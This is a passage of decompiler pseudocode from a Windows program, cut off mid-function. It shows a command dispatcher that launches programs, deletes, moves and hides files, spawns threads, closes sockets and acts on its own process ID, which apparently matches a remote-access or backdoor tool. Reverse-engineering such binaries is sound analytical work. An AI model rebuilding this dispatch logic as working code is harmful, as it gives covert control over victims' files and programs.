fcn.00405a48();\n                                fcn.004059a4();\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                **0x4a50b0 = 1;\n                                fcn.00405894();\n                                if (uVar13) {\n                                    uVar13 = 1;\n                                    fcn.0048d5b4();\n                                }\n                                fcn.00405894();\n                                if (uVar13) {\n                                    uVar13 = 1;\n                                    fcn.0048d708();\n                                }\n                                fcn.00405894();\n                                if (uVar13) {\n                                    sub.user32.dll_SendMessageA();\n                                }\n                                fcn.00405894();\n                                if (uVar13) {\n                                    fcn.0048e7a0();\n                                }\n                                puVar4 = sub.kernel32.dll_LocalAlloc_1();\n                                var_1b0h = puVar4;\n                                fcn.004054c0();\n                                uVar5 = fcn.00409dd8();\n                                *puVar4 = uVar5;\n                                uVar5 = fcn.00409dd8();\n                                puVar4[1] = uVar5;\n                                fcn.004054c0();\n                                uVar5 = fcn.00409dd8();\n                                puVar4[4] = uVar5;\n                                uVar5 = fcn.00409dd8();\n                                puVar4[5] = uVar5;\n                                uVar5 = fcn.00409dd8();\n                                puVar4[6] = uVar5;\n                                uVar5 = fcn.00409dd8();\n                                puVar4[7] = uVar5;\n                                sub.kernel32.dll_CreateThread();\n                                sub.kernel32.dll_CloseHandle_1();\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                **0x4a50b0 = 0;\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00409dd8();\n                                fcn.00490790();\n                            }\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                **0x4a5110 = 0;\n                                fcn.004302b8();\n                                fcn.00404640();\n                            }\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405504();\n                                fcn.004054c0();\n                                fcn.0048c270();\n                                fcn.0040ee40(&fcn.00493dac::var_26ch, *0x49b98c);\n                                fcn.00405504();\n                                cVar1 = fcn.0048c3dc();\n                                if (cVar1 == '\\0') {\n                                    fcn.00405504();\n                                }\n                                else {\n                                    fcn.00405504();\n                                }\n                                fcn.0048c2ec();\n                                if (var_270h == NULL) {\n                                    fcn.0040546c();\n                                }\n                                else {\n                                    fcn.00405504();\n                                }\n                                fcn.00485828();\n                                fcn.00409c6c();\n                                fcn.0048c1cc();\n                                fcn.0048c190();\n                                uVar5 = fcn.0048d948();\n                                uVar13 = 1;\n                                uStack316 = 0x49474b;\n                                fcn.00409d58(uVar5);\n                                uStack316 = var_288h;\n                                uStack320 = 0x49ba08;\n                                uStack324 = 0x49b8bc;\n                                puStack328 = 0x494766;\n                                fcn.0048c718();\n                                puStack328 = var_28ch;\n                                iStack332 = var_14h;\n                                uStack336 = 0x49ba14;\n                                puStack340 = 0x49477f;\n                                fcn.0048ca58();\n                                puStack340 = 0x494790;\n                                fcn.0040a49c();\n                                puStack340 = var_290h;\n                                uStack344 = 0x49ba20;\n                                uStack348 = 0x49b8bc;\n                                puStack352 = 0x4947ab;\n                                fcn.0048ef08();\n                                puStack352 = var_298h;\n                                uStack356 = 0x49b8bc;\n                                iStack360 = var_18h;\n                                uStack364 = 0x49b8bc;\n                                uStack368 = 0x4947c9;\n                                fcn.0048c208();\n                                uStack368 = var_29ch;\n                                uStack372 = 0x49b8bc;\n                                puStack376 = var_1ch;\n                                uStack380 = 0x49b8bc;\n                                uStack384 = **0x4a4ce0;\n                                uStack388 = 0x49b8bc;\n                                puStack392 = 0x4947f3;\n                                fcn.0048d0a0();\n                                puStack392 = var_2a0h;\n                                var_188h = 0x49b8bc;\n                                puStack400 = 0x494809;\n                                fcn.0048cfc4();\n                                puStack400 = var_2a4h;\n                                uStack404 = 0x49b8bc;\n                                uStack408 = **0x4a4dcc;\n                                var_198h = 0x49482b;\n                                fcn.00405800();\n                                var_198h = 0x494836;\n                                fcn.004938a4();\n                            }\n                            var_198h = &fcn.00493dac::var_2a8h;\n                            uStack416 = 0x49484f;\n                            fcn.00405964();\n                            uStack416 = 0x49485f;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uStack416 = 0x494877;\n                                fcn.004059a4();\n                                uStack416 = 0x494882;\n                                fcn.0048c2ec();\n                                if (var_2ach == 0) {\n                                    uStack416 = 0x4948a2;\n                                    fcn.0040546c();\n                                }\n                                else {\n                                    uStack416 = 0x494898;\n                                    fcn.00405504();\n                                }\n                                uStack416 = 0x49ba40;\n                                var_1a0h = **0x4a4d04;\n                                var_1a4h = 0x49b8bc;\n                                puStack428 = var_8h;\n                                iStack432 = 0x49b8bc;\n                                var_1b0h = 0x4948c0;\n                                var_1b4h = fcn.0048d948();\n                                uVar13 = 1;\n                                var_1b0h = NULL;\n                                puStack444 = 0x4948cf;\n                                fcn.00409d58(var_1b4h);\n                                puStack444 = var_2b4h;\n                                uStack448 = 0x49ba08;\n                                uStack452 = 0x49b8bc;\n                                puStack456 = var_ch;\n                                var_1c8h = 0x49b8bc;\n                                iStack464 = 0x4948f2;\n                                fcn.0048d0a0();\n                                iStack464 = var_2b8h;\n                                iStack468 = 0x49b8bc;\n                                uStack472 = 0x494908;\n                                fcn.0048c270();\n                                uStack472 = var_2bch;\n                                var_1d8h = 0x49491e;\n                                fcn.00405800();\n                                var_1d8h = 0x494929;\n                                fcn.004938a4();\n                            }\n                            var_1d8h = &fcn.00493dac::var_2c0h;\n                            puStack480 = 0x494942;\n                            fcn.00405964();\n                            puStack480 = 0x494952;\n                            fcn.00405894();\n                            if (uVar13) {\n                                puStack480 = 0x49496a;\n                                fcn.004059a4();\n                                puStack480 = &fcn.00493dac::var_2c4h;\n                                var_1e0h = 0x49497e;\n                                fcn.00405a48();\n                                var_1e0h = 0x49498e;\n                                fcn.00405964();\n                                var_1e0h = 0x494999;\n                                uVar5 = fcn.00409dd8();\n                                **0x4a4cf4 = uVar5;\n                                var_1e0h = 0x4949ae;\n                                fcn.00405a48();\n                                var_1e0h = 0x4949bd;\n                                fcn.004059a4();\n                                var_1e0h = &fcn.00493dac::var_2c8h;\n                                wParam = 0x4949d1;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                wParam = 0x4949e1;\n                                fcn.00405964();\n                                wParam = 0x4949ec;\n                                uVar5 = fcn.00409dd8();\n                                **0x4a4e6c = uVar5;\n                                wParam = 0x494a01;\n                                fcn.00405a48();\n                                wParam = 0x494a10;\n                                fcn.004059a4();\n                                wParam = 0x494a18;\n                                uVar5 = fcn.00409dd8();\n                                **0x4a4dec = uVar5;\n                                wParam = 0x4;\n                                uStack492 = 0x40;\n                                puStack496 = 0x494a29;\n                                puStack504 = sub.kernel32.dll_LocalAlloc_1();\n                                puStack496 = 0x494a45;\n                                var_1c8h = puStack504;\n                                fcn.00409c6c();\n                                puStack496 = 0x494a56;\n                                fcn.004054c0();\n                                puStack496 = &fcn.00493dac::var_4h;\n                                puStack500 = NULL;\n                                pcStack508 = fcn.00492348;\n                                uStack512 = 0;\n                                uStack516 = 0;\n                                uStack520 = 0x494a6b;\n                                uStack520 = sub.kernel32.dll_CreateThread();\n                                puStack524 = 0x494a71;\n                                sub.kernel32.dll_CloseHandle_1();\n                            }\n                            puStack524 = &fcn.00493dac::var_2d0h;\n                            uStack528 = 0x494a8a;\n                            fcn.00405964();\n                            uStack528 = 0x494a9a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uStack528 = 0x494aae;\n                                fcn.004059a4();\n                                uStack528 = 0x40;\n                                uStack532 = 0x49ba6c;\n                                puStack536 = 0x494abd;\n                                puStack536 = fcn.004058fc();\n                                uStack540 = 0;\n                                puStack544 = 0x494ac5;\n                                sub.user32.dll_MessageBoxA_1();\n                            }\n                            puStack544 = &fcn.00493dac::var_2d4h;\n                            uStack548 = 0x494ade;\n                            fcn.00405964();\n                            uStack548 = 0x494aee;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uStack548 = 0x494b02;\n                                fcn.004059a4();\n                                uStack548 = 5;\n                                uStack552 = 0;\n                                uStack556 = 0;\n                                uStack560 = 0x494b10;\n                                uStack560 = fcn.004058fc();\n                                uStack564 = 0x49ba84;\n                                var_234h = NULL;\n                                lpBuffer = 0x494b1d;\n                                sub.shell32.dll_ShellExecuteA();\n                            }\n                            lpBuffer = 0x494b2a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                lpBuffer = 0x494b37;\n                                fcn.0048b5d8();\n                                lpBuffer = 0x494b4d;\n                                fcn.00405784();\n                                lpBuffer = 0x494b58;\n                                fcn.004938a4();\n                            }\n                            lpBuffer = 0x494b65;\n                            fcn.00405894();\n                            if (uVar13) {\n                                lpBuffer = 0x494b72;\n                                fcn.0049066c();\n                                lpBuffer = 0x494b88;\n                                fcn.00405784();\n                                lpBuffer = 0x494b93;\n                                fcn.004938a4();\n                            }\n                            lpBuffer = &fcn.00493dac::var_2e8h;\n                            var_23ch = 0x494bac;\n                            fcn.00405964();\n                            var_23ch = 0x494bbc;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_23ch = 0x494bd4;\n                                fcn.004059a4();\n                                var_23ch = &fcn.00493dac::var_ch;\n                                var_240h = 0x494be5;\n                                fcn.00405a48();\n                                var_240h = 0x494bf5;\n                                fcn.00405964();\n                                var_240h = 0x494c02;\n                                fcn.00405a48();\n                                var_240h = 0x494c11;\n                                fcn.004059a4();\n                                var_240h = &fcn.00493dac::var_10h;\n                                var_244h = 0x494c22;\n                                fcn.00405a48();\n                                var_244h = 0x494c32;\n                                fcn.00405964();\n                                var_244h = 0x494c3f;\n                                fcn.00405a48();\n                                var_244h = 0x494c4e;\n                                fcn.004059a4();\n                                var_244h = &fcn.00493dac::var_14h;\n                                var_248h = 0x494c5f;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_248h = 0x494c6f;\n                                fcn.00405964();\n                                var_248h = 0x494c7c;\n                                fcn.00405a48();\n                                var_248h = 0x494c8b;\n                                fcn.004059a4();\n                                var_248h = 0x494c96;\n                                fcn.00405504();\n                                var_24ch = 0x494ca5;\n                                var_248h = &stack0xfffffffc;\n                                fcn.0048b184();\n                                var_24ch = 0x494cb6;\n                                fcn.00493ce0(var_248h);\n                            }\n                            var_248h = 0x494cc4;\n                            fcn.00405894();\n                            if (uVar13) {\n                                uVar13 = 1;\n                                var_248h = 0x494cd3;\n                                fcn.0048e3cc();\n                                var_248h = 0x494ce9;\n                                fcn.00405784();\n                                var_248h = 0x494cf4;\n                                fcn.004938a4();\n                            }\n                            var_248h = 0x494d01;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_248h = 0x494d13;\n                                fcn.0048e3cc();\n                                var_248h = 0x494d29;\n                                fcn.00405784();\n                                var_248h = 0x494d34;\n                                fcn.004938a4();\n                            }\n                            var_248h = 0x494d41;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_248h = 0x494d48;\n                                sub.kernel32.dll_GetCurrentProcessId();\n                                var_248h = 0x494d4d;\n                                fcn.0048abec();\n                            }\n                            var_248h = 0x494d5a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_248h = **0x4a4f1c;\n                                var_24ch = 0x494d69;\n                                sub.wsock32.dll_closesocket();\n                            }\n                            var_248h = 0x494d76;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_248h = 0x494d8d;\n                                fcn.00405894();\n                                if (uVar13) {\n                                    var_248h = 0x49bb68;\n                                    var_24ch = **0x4a4c50;\n                                    var_250h = 0x49bb90;\n                                    var_254h = 0x494dea;\n                                    fcn.00405800();\n                                    var_254h = 0x494df5;\n                                    fcn.0048b0c8();\n                                }\n                                else {\n                                    var_248h = 0x49bb68;\n                                    uVar13 = 1;\n                                    var_24ch = 0x494da1;\n                                    fcn.0040f130();\n                                    var_24ch = var_304h;\n                                    var_250h = 0x49bb90;\n                                    var_254h = 0x494dbc;\n                                    fcn.00405800();\n                                    var_254h = 0x494dc7;\n                                    fcn.0048b0c8();\n                                }\n                                var_254h = 0x494dfa;\n                                sub.kernel32.dll_GetCurrentProcessId();\n                                var_254h = 0x494dff;\n                                fcn.0048abec();\n                            }\n                            var_248h = &fcn.00493dac::var_30ch;\n                            var_24ch = 0x494e18;\n                            fcn.00405964();\n                            var_24ch = 0x494e28;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_24ch = 0x494e3c;\n                                fcn.004059a4();\n                                var_24ch = 0x494e48;\n                                cVar1 = fcn.0048da1c();\n                                uVar13 = cVar1 == '\\0';\n                                if (uVar13) {\n                                    var_24ch = 0x494e56;\n                                    fcn.004938a4();\n                                }\n                            }\n                            var_24ch = &fcn.00493dac::var_310h;\n                            var_250h = 0x494e6f;\n                            fcn.00405964();\n                            var_250h = 0x494e7f;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_250h = 0x494e97;\n                                fcn.004059a4();\n                                var_250h = &fcn.00493dac::var_ch;\n                                var_254h = 0x494ea8;\n                                fcn.00405a48();\n                                var_254h = 0x494eb8;\n                                fcn.00405964();\n                                var_254h = 0x494ec5;\n                                fcn.00405a48();\n                                var_254h = 0x494ed4;\n                                fcn.004059a4();\n                                var_254h = 0x494edf;\n                                fcn.00405504();\n                                var_254h = 0x494eed;\n                                fcn.00409a78();\n                                if (var_314h == 0) {\n                                    var_254h = 5;\n                                    var_258h = 0x494f51;\n                                    fcn.0040a49c();\n                                    var_258h = 0x494f5c;\n                                    var_258h = fcn.004058fc();\n                                    var_25ch = 0;\n                                    var_260h = 0x494f67;\n                                    var_260h = fcn.004058fc();\n                                    var_264h = 0x49ba84;\n                                    var_268h = 0;\n                                    var_26ch = 0x494f74;\n                                    uVar6 = sub.shell32.dll_ShellExecuteA();\n                                    uVar13 = uVar6 == 0x20;\n                                    if (uVar6 < 0x21) {\n                                        var_26ch = 0x494f83;\n                                        fcn.004938a4();\n                                    }\n                                }\n                                else {\n                                    var_254h = 5;\n                                    var_258h = 0x494f06;\n                                    fcn.0040a49c();\n                                    var_258h = 0x494f11;\n                                    var_258h = fcn.004058fc();\n                                    var_25ch = 0x494f1a;\n                                    var_25ch = fcn.004058fc();\n                                    var_260h = 0x494f23;\n                                    var_260h = fcn.004058fc();\n                                    var_264h = 0x49ba84;\n                                    var_268h = 0;\n                                    var_26ch = 0x494f30;\n                                    uVar6 = sub.shell32.dll_ShellExecuteA();\n                                    uVar13 = uVar6 == 0x20;\n                                    if (uVar6 < 0x21) {\n                                        var_26ch = 0x494f3f;\n                                        fcn.004938a4();\n                                    }\n                                }\n                            }\n                            var_26ch = &fcn.00493dac::var_320h;\n                            var_270h = 0x494f9c;\n                            fcn.00405964();\n                            var_270h = 0x494fac;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_270h = 0x494fc4;\n                                fcn.004059a4();\n                                var_270h = &fcn.00493dac::var_ch;\n                                var_274h = 0x494fd5;\n                                fcn.00405a48();\n                                var_274h = 0x494fe5;\n                                fcn.00405964();\n                                var_274h = 0x494ff2;\n                                fcn.00405a48();\n                                var_274h = 0x495001;\n                                fcn.004059a4();\n                                var_274h = 0x49500c;\n                                fcn.00405504();\n                                var_274h = 0x49501a;\n                                fcn.00409a78();\n                                if (var_324h == NULL) {\n                                    var_274h = 0;\n                                    var_278h = 0x49507e;\n                                    fcn.0040a49c();\n                                    var_278h = 0x495089;\n                                    var_278h = fcn.004058fc();\n                                    var_27ch = 0;\n                                    var_280h = 0x495094;\n                                    var_280h = fcn.004058fc();\n                                    var_284h = 0x49ba84;\n                                    var_288h = 0;\n                                    var_28ch = 0x4950a1;\n                                    uVar6 = sub.shell32.dll_ShellExecuteA();\n                                    uVar13 = uVar6 == 0x20;\n                                    if (uVar6 < 0x21) {\n                                        var_28ch = 0x4950b0;\n                                        fcn.004938a4();\n                                    }\n                                }\n                                else {\n                                    var_274h = 0;\n                                    var_278h = 0x495033;\n                                    fcn.0040a49c();\n                                    var_278h = 0x49503e;\n                                    var_278h = fcn.004058fc();\n                                    var_27ch = 0x495047;\n                                    var_27ch = fcn.004058fc();\n                                    var_280h = 0x495050;\n                                    var_280h = fcn.004058fc();\n                                    var_284h = 0x49ba84;\n                                    var_288h = 0;\n                                    var_28ch = 0x49505d;\n                                    uVar6 = sub.shell32.dll_ShellExecuteA();\n                                    uVar13 = uVar6 == 0x20;\n                                    if (uVar6 < 0x21) {\n                                        var_28ch = 0x49506c;\n                                        fcn.004938a4();\n                                    }\n                                }\n                            }\n                            var_28ch = &fcn.00493dac::var_330h;\n                            var_290h = 0x4950c9;\n                            fcn.00405964();\n                            var_290h = 0x4950d9;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_290h = 0x4950ed;\n                                fcn.004059a4();\n                                var_290h = &fcn.00493dac::var_ch;\n                                var_294h = 0x4950fe;\n                                iVar3 = fcn.00405a48();\n                                uVar13 = iVar3 == 1;\n                                var_294h = 0x49510e;\n                                fcn.00405964();\n                                var_294h = 0x49511b;\n                                fcn.00405a48();\n                                var_294h = 0x49512a;\n                                fcn.004059a4();\n                                var_294h = 0x495132;\n                                fcn.00409dd8();\n                                var_294h = 0x49513c;\n                                fcn.0048dac4();\n                            }\n                            var_294h = &fcn.00493dac::var_334h;\n                            var_298h = 0x495155;\n                            fcn.00405964();\n                            var_298h = 0x495165;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_298h = 0x49517d;\n                                fcn.004059a4();\n                                var_298h = &fcn.00493dac::var_ch;\n                                var_29ch = 0x49518e;\n                                fcn.00405a48();\n                                var_29ch = 0x49519e;\n                                fcn.00405964();\n                                var_29ch = 0x4951ab;\n                                fcn.00405a48();\n                                var_29ch = 0x4951ba;\n                                fcn.004059a4();\n                                var_29ch = 0x4951c2;\n                                iVar3 = fcn.00409dd8();\n                                uVar13 = iVar3 == 1;\n                                if (iVar3 < 2) {\n                                    var_29ch = 0x49524b;\n                                    var_29ch = fcn.004058fc();\n                                    var_2a0h = 0x495251;\n                                    sub.kernel32.dll_DeleteFileA();\n                                }\n                                else {\n                                    var_29ch = 0x4951cd;\n                                    iVar3 = fcn.00409dd8();\n                                    uVar13 = iVar3 == 0;\n                                    if (-1 < iVar3) {\n                                        iVar3 = iVar3 + 1;\n                                        iVar12 = 0;\n                                        do {\n                                            var_2a0h = 0x4951de;\n                                            iVar7 = fcn.00409dd8();\n                                            if (iVar12 == iVar7) {\n                                                var_2a0h = 0x4951ea;\n                                                var_29ch = fcn.004058fc();\n                                                var_2a4h = 0x4951f0;\n                                                sub.kernel32.dll_DeleteFileA();\n                                            }\n                                            else {\n                                                var_2a0h = &fcn.00493dac::var_10h;\n                                                var_2a4h = 0x495203;\n                                                fcn.00405a48();\n                                                var_2a4h = 0x495213;\n                                                fcn.00405964();\n                                                var_2a4h = 0x495220;\n                                                fcn.00405a48();\n                                                var_2a4h = 0x49522f;\n                                                fcn.004059a4();\n                                                var_2a4h = 0x495237;\n                                                var_29ch = fcn.004058fc();\n                                                var_2a8h = 0x49523d;\n                                                sub.kernel32.dll_DeleteFileA();\n                                            }\n                                            iVar12 = iVar12 + 1;\n                                            iVar3 = iVar3 + -1;\n                                            uVar13 = iVar3 == 0;\n                                        } while (!uVar13);\n                                    }\n                                }\n                            }\n                            var_2a0h = &fcn.00493dac::var_338h;\n                            var_2a4h = 0x49526a;\n                            fcn.00405964();\n                            var_2a4h = 0x49527a;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2a4h = 0x495292;\n                                fcn.004059a4();\n                                var_2a4h = &fcn.00493dac::var_ch;\n                                var_2a8h = 0x4952a3;\n                                fcn.00405a48();\n                                var_2a8h = 0x4952b3;\n                                fcn.00405964();\n                                var_2a8h = 0x4952c0;\n                                fcn.00405a48();\n                                var_2a8h = 0x4952cf;\n                                fcn.004059a4();\n                                var_2a8h = 0x4952d7;\n                                iVar3 = fcn.00409dd8();\n                                uVar13 = iVar3 == 1;\n                                if (iVar3 < 2) {\n                                    var_2a8h = 0x495354;\n                                    fcn.0048dbcc();\n                                }\n                                else {\n                                    var_2a8h = 0x4952e2;\n                                    iVar3 = fcn.00409dd8();\n                                    uVar13 = iVar3 == 0;\n                                    if (-1 < iVar3) {\n                                        iVar3 = iVar3 + 1;\n                                        iVar12 = 0;\n                                        do {\n                                            var_2a8h = 0x4952f3;\n                                            iVar7 = fcn.00409dd8();\n                                            if (iVar12 == iVar7) {\n                                                var_2a8h = 0x4952ff;\n                                                fcn.0048dbcc();\n                                            }\n                                            else {\n                                                var_2a4h = &fcn.00493dac::var_10h;\n                                                var_2ach = 0x495312;\n                                                fcn.00405a48();\n                                                var_2ach = 0x495322;\n                                                fcn.00405964();\n                                                var_2ach = 0x49532f;\n                                                fcn.00405a48();\n                                                var_2ach = 0x49533e;\n                                                fcn.004059a4();\n                                                var_2ach = 0x495346;\n                                                fcn.0048dbcc();\n                                            }\n                                            iVar12 = iVar12 + 1;\n                                            iVar3 = iVar3 + -1;\n                                            uVar13 = iVar3 == 0;\n                                        } while (!uVar13);\n                                    }\n                                }\n                            }\n                            var_2a8h = 0x495361;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2a8h = 0x495368;\n                                fcn.0048dc70();\n                            }\n                            var_2a8h = &fcn.00493dac::var_33ch;\n                            var_2ach = 0x495381;\n                            fcn.00405964();\n                            var_2ach = 0x495391;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2ach = 0x4953a5;\n                                fcn.004059a4();\n                                var_2ach = 0x80;\n                                var_2b0h = 0x4953b2;\n                                var_2b0h = fcn.004058fc();\n                                var_2b4h = 0x4953b8;\n                                sub.kernel32.dll_SetFileAttributesA();\n                            }\n                            var_2b4h = &fcn.00493dac::var_340h;\n                            var_2b8h = 0x4953d1;\n                            fcn.00405964();\n                            var_2b8h = 0x4953e1;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2b8h = 0x4953f5;\n                                fcn.004059a4();\n                                var_2b8h = 2;\n                                var_2bch = 0x4953ff;\n                                var_2bch = fcn.004058fc();\n                                var_2c0h = 0x495405;\n                                sub.kernel32.dll_SetFileAttributesA();\n                            }\n                            var_2c0h = &fcn.00493dac::var_344h;\n                            var_2c4h = 0x49541e;\n                            fcn.00405964();\n                            var_2c4h = 0x49542e;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2c4h = 0x495442;\n                                fcn.004059a4();\n                                var_2c4h = 1;\n                                var_2c8h = 0x49544c;\n                                var_2c8h = fcn.004058fc();\n                                var_2cch = 0x495452;\n                                sub.kernel32.dll_SetFileAttributesA();\n                            }\n                            var_2cch = &fcn.00493dac::var_348h;\n                            var_2d0h = 0x49546b;\n                            fcn.00405964();\n                            var_2d0h = 0x49547b;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2d0h = 0x49548f;\n                                fcn.004059a4();\n                                var_2d0h = 4;\n                                var_2d4h = 0x495499;\n                                var_2d4h = fcn.004058fc();\n                                var_2d8h = 0x49549f;\n                                sub.kernel32.dll_SetFileAttributesA();\n                            }\n                            var_2d8h = &fcn.00493dac::var_34ch;\n                            var_2dch = 0x4954b8;\n                            fcn.00405964();\n                            var_2dch = 0x4954c8;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2dch = 0x4954dc;\n                                fcn.004059a4();\n                                var_2dch = 0x20;\n                                var_2e0h = 0x4954e6;\n                                var_2e0h = fcn.004058fc();\n                                var_2e4h = 0x4954ec;\n                                sub.kernel32.dll_SetFileAttributesA();\n                            }\n                            var_2e4h = &fcn.00493dac::var_350h;\n                            var_2e8h = 0x495505;\n                            fcn.00405964();\n                            var_2e8h = 0x495515;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2e8h = 0x495529;\n                                fcn.004059a4();\n                                var_2e8h = 0x100;\n                                var_2ech = 0x495536;\n                                var_2ech = fcn.004058fc();\n                                var_2f0h = 0x49553c;\n                                sub.kernel32.dll_SetFileAttributesA();\n                            }\n                            var_2f0h = &fcn.00493dac::var_354h;\n                            var_2f4h = 0x495555;\n                            fcn.00405964();\n                            var_2f4h = 0x495565;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_2f4h = 0x49557d;\n                                fcn.004059a4();\n                                var_2f4h = 0x495590;\n                                fcn.0040a384();\n                                uVar6 = var_188h;\n                                if ((var_188h & 2) == 0) {\n                                    var_2f4h = 0x4955ba;\n                                    fcn.00405504();\n                                }\n                                else {\n                                    var_2f4h = 0x4955ab;\n                                    fcn.00405504();\n                                }\n                                if ((uVar6 & 1) == 0) {\n                                    var_2f4h = 0x4955de;\n                                    fcn.00405504();\n                                }\n                                else {\n                                    var_2f4h = 0x4955cf;\n                                    fcn.00405504();\n                                }\n                                if ((uVar6 & 0x20) == 0) {\n                                    var_2f4h = 0x495602;\n                                    fcn.00405504();\n                                }\n                                else {\n                                    var_2f4h = 0x4955f3;\n                                    fcn.00405504();\n                                }\n                                uVar13 = (uVar6 & 4) == 0;\n                                if (uVar13) {\n                                    var_2f4h = 0x495626;\n                                    fcn.00405504();\n                                }\n                                else {\n                                    var_2f4h = 0x495617;\n                                    fcn.00405504();\n                                }\n                                var_2f4h = 0x49bd60;\n                                var_2f8h = var_8h;\n                                var_2fch = 0x49bd78;\n                                var_300h = 0x49bd84;\n                                var_304h = var_ch;\n                                var_308h = 0x49bda0;\n                                var_30ch = var_10h;\n                                var_310h = 0x49bda0;\n                                var_314h = var_14h;\n                                var_318h = 0x49bda0;\n                                var_31ch = var_18h;\n                                var_320h = 0x49bdac;\n                                var_324h = 0x495668;\n                                fcn.00405800();\n                                var_324h = 0x495673;\n                                fcn.004938a4();\n                            }\n                            var_324h = &fcn.00493dac::var_35ch;\n                            var_328h = 0x49568c;\n                            fcn.00405964();\n                            var_328h = 0x49569c;\n                            fcn.00405894();\n                            if (uVar13) {\n                                var_328h = 0x4956b4;\n                                fcn.004059a4();\n                                uVar13 = **0x4a4d14 == 0;\n                                if (!uVar13) {\n                                    var_328h = &fcn.00493dac::var_ch;\n                                    var_32ch = 0x4956d8;\n                                    fcn.00405a48();\n                                    var_32ch = 0x4956ec;\n                                    fcn.00405964();\n                                    var_32ch = 0x4956fe;\n                                    fcn.00405a48();\n                                    var_32ch = 0x49570f;\n                                    fcn.004059a4();\n                                    var_32ch = &fcn.00493dac::var_360h;\n                                    var_330h = 0x495728;\n                                    iVar3 = fcn.00405a48();\n                                    uVar13 = iVar3 == 1;\n                                    var_330h = 0x49573c;\n                                    fcn.00405964();\n                                    var_330h = 0x495747;\n                                    iVar3 = fcn.00409dd8();\n                                    var_330h = 0x49575b;\n                                    fcn.00405a48();\n                                    var_330h = 0x49576c;\n                                    fcn.004059a4();\n                                    var_330h = 0x49577c;\n                                    fcn.00405504();\n                                    var_330h = 0x495789;\n                                    fcn.00405894();\n                                    if (uVar13) {\n                                        uVar13 = iVar3 == 1;\n                                        if (iVar3 < 2) {\n                                            var_330h = 0xffffffff;\n                                            var_334h = 0x49590f;\n                                            fcn.0040a588();\n                                            var_334h = 0x495923;\n                                            fcn.00405784();\n                                            var_334h = 0x49592e;\n                                            var_334h = fcn.004058fc();\n                                            var_338h = 0x495937;\n                                            var_338h = fcn.004058fc();\n                                            var_33ch = 0x49593d;\n                                            sub.kernel32.dll_CopyFileA();\n                                            var_33ch = 0x495945;\n                                            var_33ch = fcn.004058fc();\n                                            var_340h = 0x49594b;\n                                            sub.kernel32.dll_DeleteFileA();\n                                        }\n                                        else {\n                                            uVar13 = iVar3 == 0;\n                                            if (0 < iVar3) {\n                                                iVar7 = 1;\n                                                iVar12 = iVar3;\n                                                do {\n                                                    if (iVar3 == iVar7) {\n                                                        var_33ch = 0xffffffff;\n                                                        var_340h = 0x4958b6;\n                                                        fcn.0040a588();\n                                                        var_340h = 0x4958ca;\n                                                        fcn.00405784();\n                                                        var_340h = 0x4958d5;\n                                                        var_340h = fcn.004058fc();\n                                                        var_344h = 0x4958de;\n                                                        var_344h = fcn.004058fc();\n                                                        var_348h = 0x4958e4;\n                                                        sub.kernel32.dll_CopyFileA();\n                                                        var_348h = 0x4958ec;\n                                                        var_338h = fcn.004058fc();\n                                                        var_34ch = 0x4958f2;\n                                                        sub.kernel32.dll_DeleteFileA();\n                                                    }\n                                                    else {\n                                                        var_33ch = 0xffffffff;\n                                                        var_340h = &fcn.00493dac::var_36ch;\n                                                        var_344h = 0x4957c5;\n                                                        fcn.00405a48();\n                                                        var_344h = 0x4957d5;\n                                                        fcn.00405964();\n                                                        var_344h = 0x4957e6;\n                                                        fcn.0040a588();\n                                                        var_344h = 0x4957fa;\n                                                        fcn.00405784();\n                                                        var_344h = 0x495805;\n                                                        var_344h = fcn.004058fc();\n                                                        var_348h = &fcn.00493dac::var_370h;\n                                                        var_34ch = 0x49581a;\n                                                        fcn.00405a48();\n                                                        var_34ch = 0x49582a;\n                                                        fcn.00405964();\n                                                        var_34ch = 0x495835;\n                                                        var_34ch = fcn.004058fc();\n                                                        var_350h = 0x49583b;\n                                                        sub.kernel32.dll_CopyFileA();\n                                                        var_350h = &fcn.00493dac::var_374h;\n                                                        var_354h = 0x49584f;\n                                                        fcn.00405a48();\n                                                        var_354h = 0x49585f;\n                                                        fcn.00405964();\n                                                        var_1d8h = var_374h;\n                                                        var_354h = 0x495876;\n                                                        var_338h = fcn.004058fc();\n                                                        var_358h = 0x49587c;\n                                                        iVar8 = sub.kernel32.dll_DeleteFileA();\n                                                        puStack480 = puStack480 & 0xffffff | 1 - (iVar8 == 0) << 0x18;\n                                                        var_358h = 0x495895;\n                                                        fcn.00405a48();\n                                                        var_358h = 0x4958a4;\n                                                        fcn.004059a4();\n                                                    }\n                                                    iVar7 = 